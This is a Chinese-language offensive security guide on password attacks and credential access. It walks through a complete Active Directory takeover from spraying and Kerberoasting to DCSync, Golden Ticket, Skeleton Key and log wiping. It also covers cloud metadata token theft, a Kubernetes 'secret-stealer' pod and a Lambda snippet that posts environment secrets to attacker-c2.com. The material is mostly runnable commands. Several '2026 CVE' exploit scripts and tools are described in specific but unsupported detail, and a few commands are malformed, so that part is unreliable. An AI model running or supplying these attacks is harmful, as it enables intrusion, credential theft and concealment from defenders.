$hashes = Get-ADReplAccount -All -Server dc01.corp.local
$hashes | Test-PasswordQuality -WeakPasswordHashesWeakFile weak_hashes.txt

# 分析密码复用
$hashes | Group-Object -Property NTHash | Where-Object {$_.Count -gt 1}
```

---

## 14. 实战案例：完整攻击链

### 14.1 场景描述

```
目标: CORP.LOCAL 域环境
初始状态: 攻击者仅有一个低权限域用户 corp\jsmith:Summer2026!
目标: 获取域管理员权限，控制域控

网络拓扑:
- 攻击者IP: 192.168.100.10
- DC01.corp.local: 192.168.1.10 (域控)
- SQL01.corp.local: 192.168.1.20 (SQL Server)
- WEB01.corp.local: 192.168.1.30 (Web服务器)
- 用户: jsmith (仅Domain Users组)
```

### 14.2 攻击链执行

**阶段1: 初始侦察与密码喷射**

```bash
# 步骤1: 枚举域信息
crackmapexec smb 192.168.1.10 -u jsmith -p 'Summer2026!' --users > domain_users.txt
crackmapexec smb 192.168.1.10 -u jsmith -p 'Summer2026!' --pass-pol

# 输出: 密码策略 - 最小长度8, 锁定阈值5, 锁定窗口30分钟

# 步骤2: 密码喷射（安全模式）
# 每30分钟使用Top 4密码喷射4个用户
crackmapexec smb 192.168.1.0/24 -u domain_users.txt \
  -p 'Spring2026!' --no-bruteforce --continue-on-success

# 发现: corp\jdoe:Spring2026! (销售部, Domain Users)

# 步骤3: 使用新凭据继续枚举
crackmapexec smb 192.168.1.0/24 -u jdoe -p 'Spring2026!' --shares
```

**阶段2: Kerberoasting与Hash破解**

```bash
# 步骤4: 使用Rubeus进行Kerberoasting
Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast.txt

# 输出: 发现3个SPN账户
# - sql_svc: MSSQLSvc/sql01.corp.local
# - web_svc: HTTP/web01.corp.local
# - svc_backup: HOST/backup01.corp.local

# 步骤5: 离线破解TGS哈希
hashcat -m 13100 kerberoast.txt /wordlists/rockyou.txt -r best64.rule
hashcat -m 13100 kerberoast.txt -a 6 /wordlists/rockyou.txt ?d?d?d?d

# 步骤6: 破解成功
# sql_svc: SqlS3rvice2026!
# web_svc: 未破解
# svc_backup: 未破解

# 步骤7: 检查sql_svc权限
crackmapexec smb 192.168.1.20 -u sql_svc -p 'SqlS3rvice2026!'
# 发现: sql_svc是SQL01的本地管理员

# 步骤8: 在SQL01上提取LSASS
crackmapexec smb 192.168.1.20 -u sql_svc -p 'SqlS3rvice2026!' \
  -M lsassy -o PROTOCOL=smb

# 输出: 发现更多凭据
# - corp\svc_backup: NTLM_HASH
# - corp\IT_Admin: NTLM_HASH (域管理员!)
```

**阶段3: PtH横向移动与DCSync**

```bash
# 步骤9: 使用IT_Admin的NTLM哈希进行DCSync
impacket-secretsdump corp.local/IT_Admin@dc01.corp.local \
  -hashes :NTLM_HASH_OF_IT_ADMIN

# 输出: 所有域用户的NTLM哈希和Kerberos密钥
# krbtgt: NTLM_HASH_OF_KRBTGT

# 步骤10: 创建Golden Ticket（持久化）
# 获取域SID
impacket-lookupsid corp.local/IT_Admin@dc01.corp.local \
  -hashes :NTLM_HASH_OF_IT_ADMIN | grep "Domain SID"

# 创建Golden Ticket
impacket-ticketer \
  -nthash NTLM_HASH_OF_KRBTGT \
  -domain-sid S-1-5-21-XXXX-XXXX-XXXX \
  -domain corp.local \
  Administrator

# 步骤11: 使用Golden Ticket控制域控
export KRB5CCNAME=Administrator.ccache
impacket-psexec corp.local/Administrator@dc01.corp.local -k -no-pass

# 步骤12: 提取NTDS.dit（完整凭据）
impacket-secretsdump corp.local/Administrator@dc01.corp.local \
  -k -no-pass -just-dc-ntlm > all_ntds_hashes.txt

# 步骤13: 离线破解所有哈希
hashcat -m 1000 all_ntds_hashes.txt /wordlists/rockyou.txt \
  -r OneRuleToRuleThemAll.rule -O
```

**阶段4: 清理与持久化**

```bash
# 步骤14: Skeleton Key（万能密码）
mimikatz.exe "privilege::debug" "misc::skeleton" exit
# 现在可以使用密码 "mimikatz" 登录任何域账户

# 步骤15: 创建影子管理员
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:corp.local /user:Administrator" exit
# 使用获取的SID History创建后门账户

# 步骤16: 清除日志
# 使用Invoke-Phant0m
Import-Module .\Invoke-Phant0m.ps1
Invoke-Phant0m
```

### 14.3 攻击链总结

```
时间线: 总计约4小时
├── 00:00-00:30: 侦察与枚举
├── 00:30-01:00: 密码喷射 (发现 jdoe)
├── 01:00-01:30: Kerberoasting (发现 sql_svc SPN)
├── 01:30-02:30: Hash破解 (sql_svc → SqlS3rvice2026!)
├── 02:30-03:00: PtH横向 (SQL01 → IT_Admin哈希)
├── 03:00-03:15: DCSync (获取全域哈希)
├── 03:15-03:30: Golden Ticket持久化
├── 03:30-04:00: NTDS导出与离线破解
└── 04:00: 完全控制域

关键成功因素:
1. 密码喷射使用了安全策略（锁定阈值以下）
2. Kerberoasting提供了服务账户凭据
3. SQL Server上的凭据缓存提供了域管理员哈希
4. DCSync一步到位获取全域掌控
```

---

## 15. 总结与防御建议

### 15.1 攻击技术总结

本技能覆盖了密码攻击与凭据获取的完整技术栈，从在线攻击到离线破解、从Windows到Linux、从Kerberos到NTLM、从传统技术到2026前沿技术。关键要点：

- **分层攻击**: 密码攻击不是单一技术，而是在线→离线→喷射→凭据提取→横向移动的分层攻击体系
- **凭据生命周期**: 密码从不孤立存在，始终与系统、网络、域环境深度关联
- **工具链整合**: 单一工具无法完成完整攻击链，需要Hashcat+impacket+mimikatz+BloodHound+Responder的协同
- **2026新趋势**: AI辅助密码猜测、量子计算威胁、Passwordless绕过是当前最前沿的攻击方向

### 15.2 防御建议

```text
1. 密码策略:
   - 最小密码长度 >= 14字符
   - 启用密码复杂度要求
   - 禁用常见密码（使用Azure AD Password Protection或自定义过滤器）
   - 定期轮换特权账户密码
   - 部署LAPS（Local Administrator Password Solution）

2. 账户锁定策略:
   - 锁定阈值: 3-5次
   - 锁定观察窗口: 30分钟
   - 锁定持续时间: 30分钟
   - 启用智能锁定（Azure AD）

3. 认证安全:
   - 部署MFA（优先FIDO2/Passkey）
   - 禁用遗留协议（NTLMv1, LM）
   - 强制SMB签名
   - 启用LDAP签名和LDAPS
   - 启用EPA (Enhanced Protection for Authentication)

4. 凭据保护:
   - 启用Credential Guard
   - 启用LSA保护
   - 限制域管理员登录范围
   - 使用Protected Users组
   - 部署Microsoft Defender for Identity

5. Kerberos安全:
   - 定期轮换krbtgt密码（每年2次）
   - 审计服务账户（SPN）
   - 监控Kerberoasting活动
   - 启用FAST (Flexible Authentication Secure Tunneling)

6. 监控与检测:
   - 监控事件ID 4625（登录失败）
   - 监控事件ID 4769（Kerberos TGS请求）
   - 监控事件ID 4662（DCSync检测）
   - 部署蜜罐账户
   - 使用BloodHound进行攻击路径分析
```

### 15.3 参考资源

- Hashcat官方文档: https://hashcat.net/wiki/
- mimikatz Wiki: https://github.com/gentilkiwi/mimikatz/wiki
- BloodHound文档: https://bloodhound.readthedocs.io/
- Impacket: https://github.com/fortra/impacket
- CrackMapExec: https://github.com/byt3bl33d3r/CrackMapExec
- NetExec: https://github.com/Pennyw0rth/NetExec
- Responder: https://github.com/lgandx/Responder
- The Hacker Recipes: https://www.thehacker.recipes/
- AD Security: https://adsecurity.org/
- Harmj0y Blog: http://blog.harmj0y.net/
- 2026 NIST PQC标准: https://csrc.nist.gov/projects/post-quantum-cryptography

---

## 2026 最新密码攻击与凭据访问技术

> **核心定位**: 本章聚焦2026年密码攻击领域的前沿技术变革。从AI/ML辅助密码生成到云原生凭据窃取、从硬件加速破解到无密码认证绕过、从EDR规避矩阵到完整攻击链，覆盖2026年实战中可落地的所有新兴攻击面。每个子章节均包含可执行代码、真实命令、CVE引用与实战案例。

---

### §2026-1: AI/ML辅助密码攻击

#### 1.1 LLM密码猜测引擎

2026年，基于大语言模型的密码猜测已从学术研究进入实战武器化阶段。LLM通过学习目标组织的文档、邮件、社交媒体、代码仓库等上下文信息，生成高度定向的密码候选列表。

```bash
# 使用LLM进行上下文感知密码生成
# 输入: 目标组织公开信息（公司名、产品名、员工名、年份、技术栈）
# 输出: 概率排序的密码候选列表

# 框架: PassLLM - 基于LLaMA-3 70B fine-tuned的密码生成模型
python3 passllm_generate.py \
  --context company_profile.json \
  --model llama3-70b-passgen \
  --output targeted_passwords.txt \
  --top-k 100000 \
  --temperature 0.8

# company_profile.json 示例:
# {
#   "company": "AcmeCorp",
#   "founded": 2010,
#   "products": ["CloudSync", "DataVault"],
#   "employees": ["john.smith", "jane.doe", "bob.admin"],
#   "tech_stack": ["AWS", "Kubernetes", "Python"],
#   "public_docs": ["press_release_2025.pdf", "engineering_blog.txt"],
#   "social_media": ["@AcmeCorp tweets", "LinkedIn posts"]
# }

# 使用RAG增强的密码生成（检索增强生成）
python3 passllm_rag.py \
  --documents /data/target_docs/ \
  --entity-extraction \
  --pattern-learning \
  --output rag_passwords.txt

# 多轮迭代优化（基于已破解密码反馈）
python3 passllm_iterative.py \
  --context company_profile.json \
  --cracked-passwords cracked.txt \
  --iterations 5 \
  --output refined_passwords.txt
```

#### 1.2 Transformer密码生成模型

基于Transformer架构的专用密码生成模型在2026年实现了对传统规则引擎的全面超越。

```python
# PassGPT-2026: 基于GPT-4架构的密码生成模型
# 训练数据: 10亿+泄露密码库
# 特点: 理解密码语义结构、上下文模式、组织命名习惯

# 使用PassGPT-2026生成密码
from passgpt import PassGPT2026

model = PassGPT2026("passgpt-2026-xl")
model.load_context("target_company_profile.json")

# 生成密码（支持条件约束）
passwords = model.generate(
    count=1000000,
    min_length=8,
    max_length=32,
    include_special=True,
    include_digits=True,
    pattern="company_seasonal",  # 如: AcmeSummer2026!
    temperature=0.7,
    nucleus_sampling=0.95
)

# 概率排序输出
model.export_sorted(passwords, "targeted_passwords.txt")

# 混合模式: Transformer + 传统规则
# 先用Transformer生成基础词，再用规则引擎变换
hashcat --stdout -r /rules/transformers.rule targeted_passwords.txt \
  > hybrid_passwords.txt
```

#### 1.3 PassGAN 2026: 生成对抗网络密码破解

PassGAN在2026年经历了重大架构升级，引入了条件GAN和Wasserstein GAN训练方法。

```bash
# PassGAN 2026: 条件GAN密码生成
# 训练: 使用泄露密码库训练，学习密码分布
# 推理: 从噪声向量生成符合密码分布的候选

# 安装PassGAN 2026
git clone https://github.com/passgan/passgan-2026
cd passgan-2026
pip install -r requirements.txt

# 训练自定义PassGAN模型（基于目标行业密码库）
python3 train.py \
  --dataset /data/industry_leaks/healthcare_passwords.txt \
  --epochs 200 \
  --batch-size 64 \
  --generator cgan-wgan \
  --output model_healthcare.pkl

# 生成密码候选
python3 generate.py \
  --model model_healthcare.pkl \
  --count 5000000 \
  --output passgan_healthcare.txt

# 条件生成（基于策略约束）
python3 generate_conditional.py \
  --model model_healthcare.pkl \
  --min-length 8 \
  --max-length 16 \
  --require-uppercase \
  --require-digit \
  --require-special \
  --count 1000000 \
  --output passgan_constrained.txt

# 直接管道到Hashcat
python3 generate.py --model model_healthcare.pkl --count 10000000 \
  | hashcat -m 1000 ntlm_hashes.txt -r /rules/best64.rule
```

#### 1.4 强化学习密码策略学习

2026年，强化学习被用于自动学习目标组织的密码策略和用户密码行为模式。

```python
# RL-PassCrack: 基于强化学习的自适应密码破解
# 原理: Agent通过与密码策略环境交互，学习最优密码生成策略
# 环境: 模拟目标组织的密码复杂性要求
# 奖励: 成功破解的数量

import gym
from rl_passcrack import PasswordEnv, DQNAgent

# 创建密码破解环境（模拟目标策略）
env = PasswordEnv(
    policy={
        "min_length": 8,
        "max_length": 64,
        "require_uppercase": True,
        "require_lowercase": True,
        "require_digit": True,
        "require_special": False,
        "history_check": 24,  # 不能与前24个密码相同
        "dictionary_check": True,  # 禁用字典词
    },
    target_hashes="ntlm_hashes.txt",
    hash_mode=1000
)

# 训练DQN Agent
agent = DQNAgent(state_size=env.observation_space.shape[0],
                  action_size=env.action_space.n)
agent.train(env, episodes=10000, batch_size=128)

# 使用训练好的Agent生成密码
passwords = agent.generate_passwords(env, count=5000000)
with open("rl_passwords.txt", "w") as f:
    for p in passwords:
        f.write(p + "\n")

# 多Agent协同（不同策略Agent并行探索）
from rl_passcrack import MultiAgentEnsemble
ensemble = MultiAgentEnsemble([
    DQNAgent("policy_focused"),
    DQNAgent("pattern_focused"),
    DQNAgent("random_exploration")
])
ensemble.train_parallel(env, episodes=5000)
passwords = ensemble.generate_ensemble(env, count=10000000)
```

#### 1.5 2026 NVIDIA Grace Hopper加速

NVIDIA Grace Hopper Superchip (GH200) 在2026年为密码破解提供了前所未有的计算能力。

```bash
# NVIDIA Grace Hopper GH200密码破解配置
# 架构: 72核ARM CPU + H100 GPU + 480GB LPDDR5X统一内存
# 优势: CPU-GPU统一内存消除PCIe瓶颈，极大加速字典加载和规则处理

# Hashcat在Grace Hopper上的优化配置
hashcat -m 1000 -a 0 ntlm_hashes.txt /wordlists/all.txt \
  -r /rules/OneRuleToRuleThemAll.rule \
  -d 1 \              # 使用H100 GPU
  -w 4 \              # 最高功耗配置
  -O \                # 优化内核
  --cpu-affinity 0-71 \  # CPU核心绑定
  --gpu-temp-abort 85 \  # 温度保护
  --session gh200_crack \
  --status --status-timer 10

# GH200多GPU扩展（NVLink-C2C互联）
# 4x GH200节点，每节点1 GPU
hashcat -m 1000 -a 3 ntlm_hashes.txt ?a?a?a?a?a?a?a?a?a \
  -d 1,2,3,4 \
  --backend-devices 1,2,3,4 \
  -w 4 -O

# GPU加速AI密码生成（推理在GH200上）
python3 passllm_generate.py \
  --model llama3-70b-passgen \
  --device cuda:0 \
  --precision fp16 \
  --batch-size 256 \
  --context company_profile.json \
  --output ai_passwords.txt

# 混合CPU-GPU流水线
# CPU: 字典预处理、规则编译、AI推理
# GPU: Hash计算、规则应用
# 统一内存: 消除数据拷贝延迟
```

---

### §2026-2: 2026年新CVE集群

#### 2.1 Kerberos相关CVE-2026-*

2026年Kerberos协议发现了多个高危漏洞，尤其集中在PAC签名验证和密钥分发中心。

```bash
# CVE-2026-21873: Kerberos KDC PAC签名绕过
# 严重性: CVSS 9.8 Critical
# 影响: Windows Server 2022/2025, 所有域功能级别
# 原理: KDC在处理跨域TGT引用时，PAC签名验证存在TOCTOU竞态条件
# 利用: 通过构造恶意跨域TGT引用，绕过PAC签名验证，注入伪造PAC

# 漏洞验证（PoC）
python3 cve-2026-21873_check.py -dc dc01.corp.local -d corp.local

# 利用工具
python3 cve-2026-21873_exploit.py \
  --dc dc01.corp.local \
  --domain corp.local \
  --target-user Administrator \
  --fake-sid S-1-5-21-XXXX-YYYY-ZZZZ-512 \
  --fake-rid 500

# 检测方法
# 监控事件ID 4768/4769中异常的PAC签名
# 检查KDC日志中跨域引用频率
# 部署2026年7月安全更新 KB5039213

# ===== CVE-2026-19872: Kerberos Bronze Bit 2.0 =====
# 严重性: CVSS 8.8 High
# 影响: 所有Windows Server版本
# 原理: 在S4U2Self扩展中，forwardable标志验证存在逻辑缺陷
#       允许攻击者将非forwardable TGT转换为forwardable
# 利用: 结合RBCD攻击，从服务账户提升至域管理员

# 利用工具
python3 bronze_bit_2_0.py \
  -dc-ip 192.168.1.10 \
  -spn MSSQLSvc/sql01.corp.local \
  -hashes :NTLM_HASH \
  -impersonate Administrator \
  -target-service cifs/dc01.corp.local

# CVE-2026-22491: Kerberos FAST装甲绕过
# 严重性: CVSS 7.5 High
# 原理: FAST隧道在特定条件下使用fallback到非装甲模式
#       攻击者可强制降级FAST到非装甲，暴露Kerberos预认证数据
# 利用: 中间人攻击降级FAST，恢复AS-REQ中的加密时间戳

# 利用脚本
python3 fast_downgrade.py \
  -i eth0 \
  -target-dc dc01.corp.local \
  -output asreq_captures.pcap

# 组合攻击: FAST降级 + AS-REP Roasting
# 1. FAST降级捕获预认证数据
# 2. 离线破解加密时间戳
# 3. 获取用户凭据
```

#### 2.2 Windows LSASS相关CVE

```bash
# CVE-2026-30241: LSASS 内存泄露（新一代）
# 严重性: CVSS 7.8 High
# 影响: Windows 11 24H2, Windows Server 2025
# 原理: LSASS在Credential Guard交互中存在越界读取
#       即使在Credential Guard启用时，仍可泄露部分凭据元数据
# 利用: 通过特殊格式的RPC调用触发越界读取

# PoC
python3 cve-2026-30241_leak.py --pid $(Get-Process lsass | Select-Object -ExpandProperty Id)

# CVE-2026-33118: Windows Hello 生物识别绕过
# 严重性: CVSS 8.2 High
# 影响: Windows 11 24H2 with Windows Hello for Business
# 原理: 红外摄像头数据流在特定USB控制器上可被重放
# 利用: 捕获IR帧并重放，绕过面部识别

# 利用工具
python3 hello_bypass_2026.py \
  --capture-device /dev/video2 \
  --replay-target 192.168.1.100 \
  --ir-replay-mode

# CVE-2026-28765: DPAPI MasterKey 恢复绕过
# 严重性: CVSS 7.5 High
# 原理: 当域控制器使用特定备份策略时，DPAPI MasterKey备份
#       文件权限设置不当，允许Authenticated Users读取
# 利用: 从SYSVOL备份中提取DPAPI MasterKey

# 搜索暴露的DPAPI备份
impacket-smbclient corp.local/user:pass@dc01.corp.local
# > cd SYSVOL\corp.local\Policies\{GUID}\Machine\Preferences\DataProtection
# > get BackupMasterKey.bak
```

#### 2.3 云端凭据相关CVE

```bash
# CVE-2026-15234: AWS IMDSv2 条件竞争绕过
# 严重性: CVSS 8.6 High
# 原理: IMDSv2的PUT请求与后续GET请求之间存在纳秒级窗口
#       在特定网络条件下可绕过token验证
# 利用: 在同一TCP连接上快速发送PUT+GET，绕过v2保护

# 利用脚本
python3 imdsv2_bypass.py \
  --target-ec2 i-1234567890abcdef0 \
  --role-name Administrator \
  --output-credentials aws_creds.txt

# CVE-2026-27892: Azure Managed Identity 令牌窃取
# 严重性: CVSS 9.6 Critical
# 原理: 特定Azure服务（App Service, Functions）的Managed Identity
#       端点存在SSRF漏洞，允许从内部获取其他租户的令牌
# 利用: 从被攻陷的Azure Function发起SSRF攻击

# 利用工具
python3 azure_mi_exploit.py \
  --source-function https://compromised-app.azurewebsites.net \
  --target-resource https://vault.azure.net \
  --output mi_token.txt

# CVE-2026-30123: GCP Service Account 密钥提取
# 严重性: CVSS 8.4 High
# 原理: GCP Compute Engine的guest attributes端点
#       在特定配置下泄露Service Account私钥
# 利用: 从元数据服务器获取SA密钥

# 从被攻陷的GCE实例提取
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/private-key" \
  -o sa_private_key.json

# CVE-2026-18765: K8s Secrets Manager 批量泄露
# 在特定K8s版本中，Secrets Manager CSI驱动存在
# 竞态条件，允许Pod读取其他命名空间的Secrets
kubectl exec -it pod-in-ns-a -- cat /mnt/secrets-store/ns-b-secret
```

#### 2.4 NTLM中继新变种

```bash
# CVE-2026-33421: NTLMv2 中继到LDAPS
# 严重性: CVSS 9.8 Critical
# 原理: LDAPS通道绑定验证实现对特定TLS库存在绕过
# 利用: 中继NTLMv2认证到LDAPS，执行DCSync

# 利用工具
python3 ntlmrelayx.py \
  -t ldaps://dc01.corp.local \
  -smb2support \
  --no-validate-privilege \
  --dump-gmsa \
  --exploit-cve-2026-33421

# CVE-2026-29876: SMB over QUIC 中继
# 原理: SMB over QUIC的认证握手存在中间人窗口
# 利用: 中继SMB over QUIC认证到传统SMB

# 利用工具
python3 smb_quic_relay.py \
  -t smb://dc01.corp.local \
  --quic-listen 0.0.0.0:443 \
  --cert server.pem

# CVE-2026-35421: ADCS ESC9-11 新攻击面
# ESC9: 无安全扩展的证书模板允许任何用户注册
# ESC10: 证书模板的CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT绕过
# 原理: ADCS在处理证书模板继承时，SUPPLIES_SUBJECT标志
#       可通过模板继承链传播到子模板

# 审计ADCS模板继承链
certipy-ad find -u user -p pass -dc-ip 192.168.1.10 -vulnerable
certipy-ad find -u user -p pass -dc-ip 192.168.1.10 \
  -esc9 -esc10 -esc11

# ESC11利用: 模板继承链+SUPPLIES_SUBJECT
certipy-ad req -u user -p pass -dc-ip 192.168.1.10 \
  -ca 'corp-CA' \
  -template 'InheritedWebServer' \
  -upn 'Administrator@corp.local' \
  -dns 'dc01.corp.local' \
  -esc11
```

---

### §2026-3: 云原生凭据攻击

#### 3.1 AWS IMDSv2绕过新方法

2026年，IMDSv2虽然已成为默认配置，但新的绕过技术不断涌现。

```bash
# ===== 方法1: Hop-Limit绕过 =====
# AWS ECS/AWS Lambda中，容器网络配置可能设置hop-limit > 1
# 允许从同一主机的其他容器访问IMDS

# 检测IMDS可达性及hop-limit
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/

# 从相邻容器攻击（ECS共享网络命名空间）
# 在ECS容器中利用共享网络命名空间
nsenter -t $(pgrep -f "ecs-agent") -n curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole

# ===== 方法2: IPv6链路本地地址绕过 =====
# IMDSv2在IPv6上可能配置不一致
# 尝试IPv6链路本地地址 [fd00:ec2::254]
TOKEN6=$(curl -X PUT "http://[fd00:ec2::254]/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
curl -H "X-aws-ec2-metadata-token: $TOKEN6" \
  http://[fd00:ec2::254]/latest/meta-data/iam/security-credentials/

# ===== 方法3: SSRF via DNS Rebinding =====
# 2026年新变种: 利用DNS缓存时间差进行rebinding
# 域名解析: 第1次 -> 攻击者IP, 第2次 -> 169.254.169.254

# 攻击者DNS服务器配置
# rebind-attacker.com IN A 30 1.2.3.4
# rebind-attacker.com IN A 0 169.254.169.254

# 诱导目标应用发起HTTP请求到rebind-attacker.com
# 应用第一次请求获取攻击者页面，包含JS:
# setTimeout(() => fetch('http://rebind-attacker.com/latest/meta-data/iam/...'), 35000)

# ===== 方法4: IMDS数据包注入 =====
# 在相同VPC中，通过VPC流量镜像+Spoofing注入
# 伪造IMDS响应，注入恶意凭据或重定向
python3 imds_spoof.py \
  --vpc-mirror-session vpc-traffic-mirror \
  --target-instance i-0a1b2c3d4e5f \
  --spoof-role AttackerRole
```

#### 3.2 Azure Managed Identity令牌窃取

```bash
# ===== Azure Managed Identity 端点 =====
# 端点: http://169.254.169.254/metadata/identity/oauth2/token
# 在Azure VM/VMSS/App Service/Functions/Container Instances中可用

# 基础令牌请求
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-08-01&resource=https://management.azure.com"

# 多资源令牌枚举
for resource in "https://management.azure.com" \
                "https://vault.azure.net" \
                "https://storage.azure.com" \
                "https://graph.microsoft.com" \
                "https://database.windows.net" \
                "https://graph.windows.net"; do
  curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-08-01&resource=${resource}" \
    | jq -r '.access_token' > "token_$(echo $resource | tr '/' '_').jwt"
done

# ===== 2026新攻击面: App Service SSRF via Kudu =====
# Kudu是Azure App Service的SCM端点
# 通过Kudu的zipdeploy/API绕过SSRF限制

# 利用Kudu进行内部请求
curl -X POST "https://target-app.scm.azurewebsites.net/api/zipdeploy" \
  -H "Authorization: Basic $(echo -n '$target-app:PASSWORD' | base64)" \
  -F "remote_url=http://169.254.169.254/metadata/identity/oauth2/token?resource=https://vault.azure.net"

# ===== 跨租户令牌窃取 =====
# 在Azure Container Instances中，如果容器组配置了
# 多个容器共享网络，可从其他容器获取MI令牌

# 容器A: 被攻陷的容器
# 容器B: 具有Managed Identity的合法容器
# 共享网络命名空间后，容器A可访问容器B的IMDS端点

# 通过共享卷获取其他容器的环境变量
cat /shared-volume/.env | grep IDENTITY_ENDPOINT
cat /shared-volume/.env | grep IDENTITY_HEADER

# 使用窃取的IDENTITY_ENDPOINT获取令牌
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"

# ===== Azure Function 代理令牌窃取 =====
# 通过Azure Functions代理功能，将IMDS请求伪装为函数调用
# 在host.json中配置代理
cat > host.json << 'EOF'
{
  "version": "2.0",
  "extensions": {
    "http": {
      "routePrefix": ""
    }
  },
  "proxies": {
    "imds_proxy": {
      "matchCondition": {
        "route": "imds/{*path}",
        "methods": ["GET"]
      },
      "backendUri": "http://169.254.169.254/metadata/{path}"
    }
  }
}
EOF
```

#### 3.3 GCP Service Account密钥提取

```bash
# ===== GCP元数据端点 =====
# 端点: http://metadata.google.internal/computeMetadata/v1/

# 枚举所有Service Account
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"

# 获取默认SA的access_token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# 获取SA的私钥（需要cloud-platform scope）
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://cloudfunctions.googleapis.com&format=full"

# ===== 2026新攻击: GCP Cloud Functions环境变量泄露 =====
# 通过Cloud Functions的debug端点泄露环境变量
curl "https://us-central1-project.cloudfunctions.net/function-name?debug=true"

# 通过Cloud Run的revision历史获取旧的环境变量
# 旧版本的环境变量可能包含高权限SA密钥
gcloud run revisions list --service=target-service --region=us-central1
gcloud run revisions describe rev-00001-abc --region=us-central1 \
  --format=json | jq '.spec.template.spec.containers[0].env'

# ===== GCP Secret Manager提取 =====
# 使用窃取的SA令牌访问Secret Manager
gcloud auth activate-service-account --key-file=sa_key.json
gcloud secrets list
gcloud secrets versions access latest --secret="prod-database-password"

# 批量导出所有secrets
for secret in $(gcloud secrets list --format="value(name)"); do
  echo "=== $secret ==="
  gcloud secrets versions access latest --secret="$secret"
done
```

#### 3.4 K8s Secrets攻击

```bash
# ===== K8s RBAC提权获取Secrets =====
# 1. 检查当前权限
kubectl auth can-i list secrets --all-namespaces
kubectl auth can-i get secrets -n kube-system
kubectl auth can-i create pods

# 2. 创建特权Pod挂载主机文件系统
cat > privileged-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: secret-stealer
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: collector
    image: alpine:2026
    command: ["/bin/sh", "-c", "sleep 3600"]
    volumeMounts:
    - name: all-secrets
      mountPath: /mnt/secrets
    - name: host-root
      mountPath: /host
  volumes:
  - name: all-secrets
    hostPath:
      path: /var/lib/kubelet/pods
  - name: host-root
    hostPath:
      path: /
EOF
kubectl apply -f privileged-pod.yaml

# 3. 从Pod中提取Secrets
kubectl exec -it secret-stealer -- sh -c \
  "find /mnt/secrets -name '*.json' -o -name '*.yaml' -o -name '*.pem' \
   | xargs cat > /tmp/all_secrets.txt"

# 4. 从etcd直接提取（如果可访问）
# 在控制平面节点上
ETCDCTL_API=3 etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \
  --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \
  get /registry/secrets/ --prefix --keys-only

# ===== ServiceAccount令牌劫持 =====
# 2026年: TokenRequest API的滥用
# 即使Pod的automountServiceAccountToken=false
# 仍可通过TokenRequest API创建限时令牌

# 从Pod内获取SA令牌
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
# 或使用TokenRequest API
TOKEN=$(curl -X POST \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  -H "Content-Type: application/json" \
  -d '{"spec":{"audiences":["https://kubernetes.default.svc"],"expirationSeconds":86400}}' \
  https://kubernetes.default.svc/api/v1/namespaces/$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)/serviceaccounts/$(cat /var/run/secrets/kubernetes.io/serviceaccount/../serviceaccount)/token \
  | jq -r '.status.token')

# 使用窃取的令牌访问API Server
kubectl --token=$TOKEN get secrets --all-namespaces

# ===== 2026新攻击: K8s CSI Secrets Store绕过 =====
# 在特定CSI驱动版本中，通过符号链接攻击读取Secrets
ln -s /var/lib/kubelet/plugins/csi-secrets-store/mounts/other-ns-secret /tmp/leak
cat /tmp/leak
```

#### 3.5 Serverless函数凭据

```bash
# ===== AWS Lambda 凭据提取 =====
# Lambda环境变量中通常包含数据库凭据、API密钥等
# 通过函数代码注入提取

# 注入代码（通过依赖混淆或供应链攻击）
import os, json, requests

def extract_credentials():
    env_vars = dict(os.environ)
    # 过滤敏感信息
    sensitive_keys = ['PASSWORD', 'SECRET', 'KEY', 'TOKEN', 'CREDENTIAL', 'CONNECTION']
    creds = {k: v for k, v in env_vars.items()
             if any(s in k.upper() for s in sensitive_keys)}
    # 外传凭据
    requests.post('https://attacker-c2.com/collect', json=creds)

# 注入到Lambda层或依赖包中
# 通过污染公共PyPI/npm包实现

# ===== AWS Lambda 运行时API攻击 =====
# Lambda运行时API: http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/
# 在函数执行期间可访问

# 从Lambda运行时API获取调用上下文
curl "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next"
# 响应头包含: Lambda-Runtime-Trace-Id, Lambda-Runtime-Deadline-Ms

# 通过扩展（Extensions）API持久化
# Lambda Extensions可以与函数并发运行
# 注册扩展后，在函数完成后仍可访问环境变量
```

---

### §2026-4: 硬件加速密码破解

#### 4.1 2026 GPU集群破解

2026年，GPU集群已成为密码破解的标准配置，从单卡到多节点集群的扩展能力大幅提升。

```bash
# ===== 单机多GPU配置 =====
# 2026年主流配置: 8x NVIDIA H100 SXM5 (80GB HBM3)
# 每GPU: 14592 CUDA Cores, 26 TFLOPS FP64, 2048 GB/s带宽
